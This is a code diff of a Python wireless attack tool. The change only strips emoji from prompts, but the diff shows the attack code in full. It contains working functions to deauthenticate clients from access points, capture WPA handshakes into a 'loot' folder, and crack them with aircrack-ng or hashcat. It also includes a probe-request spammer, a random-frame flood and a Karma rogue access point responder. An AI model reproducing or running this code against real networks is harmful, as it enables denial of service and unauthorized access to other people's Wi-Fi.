@@ -75,12 +75,12 @@ def capture_handshake(iface, bssid):
         print("⚠️ No handshake captured.")
 
 def deauth_attack():
-    iface = input("💜 Monitor mode interface: ").strip()
-    target = input("💜 Target Client MAC: ").strip()
-    ap = input("💜 Access Point MAC: ").strip()
-    count = int(input("💜 Number of packets: ") or 100)
-    delay = float(input("💜 Delay between packets: ") or 0.05)
-    capture = input("💜 Capture handshake? (y/n): ").strip().lower()
+    iface = input(" Monitor mode interface: ").strip()
+    target = input(" Target Client MAC: ").strip()
+    ap = input(" Access Point MAC: ").strip()
+    count = int(input(" Number of packets: ") or 100)
+    delay = float(input(" Delay between packets: ") or 0.05)
+    capture = input(" Capture handshake? (y/n): ").strip().lower()
     if capture == "y":
         Thread(target=capture_handshake, args=(iface, ap)).start()
         time.sleep(2)
@@ -89,12 +89,12 @@ def deauth_attack():
     print("✅ Deauth complete!")
 
 def deauth_all():
-    iface = input("💜 Monitor mode interface: ").strip()
+    iface = input(" Monitor mode interface: ").strip()
     if not scan_results:
         print("⚠️ Run scan first!")
         return
-    count = int(input("💜 Number of packets per client (default 100): ") or 100)
-    delay = float(input("💜 Delay between packets (default 0.05): ") or 0.05)
+    count = int(input(" Number of packets per client (default 100): ") or 100)
+    delay = float(input(" Delay between packets (default 0.05): ") or 0.05)
     print("💥 Deauthing all clients and sniffing handshakes...\n")
     for bssid, data in scan_results.items():
         Thread(target=capture_handshake, args=(iface, bssid), daemon=True).start()
@@ -104,7 +104,7 @@ def deauth_all():
             print(f"🚀 Deauthed {client} from {data['ssid']}")
 
 def crack_handshakes():
-    print("🔓 Crack Captured Handshakes")
+    print(" Crack Captured Handshakes")
     loot_dir = "loot"
     pcaps = [f for f in os.listdir(loot_dir) if f.endswith(".pcap")]
     if not pcaps:
@@ -114,29 +114,29 @@ def crack_handshakes():
     print("\n📁 Available Handshakes:")
     for i, p in enumerate(pcaps):
         print(f"{i+1}. {p}")
-    choice = input("💜 Choose a handshake file to crack: ").strip()
+    choice = input(" Choose a handshake file to crack: ").strip()
     if not choice.isdigit() or int(choice) < 1 or int(choice) > len(pcaps):
         print("⚠️ Invalid selection.")
         return
     pcap_file = os.path.join(loot_dir, pcaps[int(choice)-1])
     
-    method = input("🛠️ Crack with (1) Aircrack-ng or (2) Hashcat? [1/2]: ").strip()
-    wordlist = input("📚 Wordlist path (default: /usr/share/wordlists/rockyou.txt): ").strip() or "/usr/share/wordlists/rockyou.txt"
+    method = input(" Crack with (1) Aircrack-ng or (2) Hashcat? [1/2]: ").strip()
+    wordlist = input(" Wordlist path (default: /usr/share/wordlists/rockyou.txt): ").strip() or "/usr/share/wordlists/rockyou.txt"
     
     if method == "1":
-        print("🚀 Launching Aircrack-ng...")
+        print(" Launching Aircrack-ng...")
         os.system(f"aircrack-ng {pcap_file} -w {wordlist}")
     elif method == "2":
         hccapx = pcap_file.replace(".pcap", ".hccapx")
         print("🔄 Converting pcap to hccapx...")
         os.system(f"cap2hccapx {pcap_file} {hccapx}")
-        print("🚀 Launching Hashcat...")
+        print(" Launching Hashcat...")
         os.system(f"hashcat -m 2500 {hccapx} {wordlist} --force")
     else:
         print("⚠️ Invalid choice.")
 
 def probe_spammer():
-    iface = input("💜 Enter monitor mode interface (e.g. wlan0mon): ").strip()
+    iface = input(" Enter monitor mode interface (e.g. wlan0mon): ").strip()
     ssids = ["FreeWiFi", "Starbucks", "McDonald's", "Xfinity", "SchoolWiFi", "UnicornNet"]
     print("📡 Spamming probe requests...")
     while True:
@@ -147,14 +147,14 @@ def probe_spammer():
         time.sleep(0.2)
 
 def junk_flood():
-    iface = input("💜 Enter monitor mode interface (e.g. wlan0mon): ").strip()
+    iface = input(" Enter monitor mode interface (e.g. wlan0mon): ").strip()
     print("💣 Sending junk packets...")
     while True:
         pkt = RadioTap()/Dot11(addr1=RandMAC(), addr2=RandMAC(), addr3=RandMAC())/Raw(load=os.urandom(50))
         sendp(pkt, iface=iface, verbose=0)
 
 def karma_responder():
-    iface = input("💜 Monitor mode interface (e.g. wlan0mon): ").strip()
+    iface = input(" Monitor mode interface (e.g. wlan0mon): ").strip()
     print("🧲 Karma responder: answering all probe requests...")
     def handle(pkt):
         if pkt.haslayer(Dot11ProbeReq):
